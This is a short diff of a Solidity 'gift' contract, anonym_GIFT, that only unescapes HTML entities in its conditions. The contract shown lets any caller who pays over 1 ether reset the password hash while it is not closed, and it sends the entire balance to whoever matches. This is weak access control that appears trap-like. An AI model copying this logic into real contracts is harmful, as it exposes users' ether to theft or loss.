@@ -6,7 +6,7 @@ contract anonym_GIFT
     external
     payable
     {
-        if(hashPass == keccak256(pass) &amp;&amp; now&gt;giftTime)
+        if(hashPass == keccak256(pass) && now>giftTime)
         {
             msg.sender.transfer(this.balance);
         }
@@ -16,7 +16,7 @@ contract anonym_GIFT
     public
     payable
     {
-        if(msg.sender==reciver &amp;&amp; now&gt;giftTime)
+        if(msg.sender==reciver && now>giftTime)
         {
             msg.sender.transfer(this.balance);
         }
@@ -38,7 +38,7 @@ contract anonym_GIFT
     public
     payable
     {
-        if( (!closed&amp;&amp;(msg.value &gt; 1 ether)) || hashPass==0x0 )
+        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x0 )
         {
             hashPass = hash;
             sender = msg.sender;
@@ -67,7 +67,7 @@ contract anonym_GIFT
     function PassHasBeenSet(bytes32 hash)
     public
     {
-        if(hash==hashPass&amp;&amp;msg.sender==sender)
+        if(hash==hashPass&&msg.sender==sender)
         {
            closed=true;
         }
